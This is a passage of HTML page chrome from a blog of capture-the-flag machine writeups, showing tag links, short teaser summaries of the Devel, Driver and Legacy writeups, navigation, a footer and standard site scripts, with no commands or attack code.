class="post-tag" href="/tags/apk/">apk</a> <a class="post-tag" href="/tags/api/">api</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/git/">git</a> <a class="post-tag" href="/tags/jwt/">jwt</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Devel/"><div class="card-body"> <em class="timeago small" data-ts="1655820000" > 2022-06-21 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Devel writeup</h3><div class="text-muted small"><p> Summary This box focuses on exploiting a Windows machine hosting an IIS service as well as an ftp service which gives write access to the IIS directory. Metasploit can then be used to gain a footho...</p></div></div></a></div><div class="card"> <a href="/posts/Driver/"><div class="card-body"> <em class="timeago small" data-ts="1655834400" > 2022-06-21 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Driver writeup</h3><div class="text-muted small"><p> Summary This quite an interesting easy box, or at least the foothold step is. It starts out with using an scf file to force the target system to connect to the attacker system when opened. The atta...</p></div></div></a></div><div class="card"> <a href="/posts/Legacy/"><div class="card-body"> <em class="timeago small" data-ts="1655920800" > 2022-06-22 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Legacy writeup</h3><div class="text-muted small"><p> Summary This was a very easy box that only required some basic google skills aswell as some knowledge of metasploit. let’s take a look. Foothold &amp;amp; Privesc Let’s start out by doing an nmap port...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/DroidComp/" class="btn btn-outline-primary" prompt="Older"><p>DroidComp writeup</p></a> <a href="/posts/Ambassador/" class="btn btn-outline-primary" prompt="Newer"><p>Ambassador writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/BitisGabonica1">BitisGabonica</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy-box/">Easy-box</a> <a class="post-tag" href="/tags/medium-box/">medium-box</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/apk/">apk</a> <a class="post-tag" href="/tags/api/">api</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/git/">git</a> <a class="post-tag" href="/tags/jwt/">jwt</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-4RZWBJKYF3"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-4RZWBJKYF3'); }); </script>
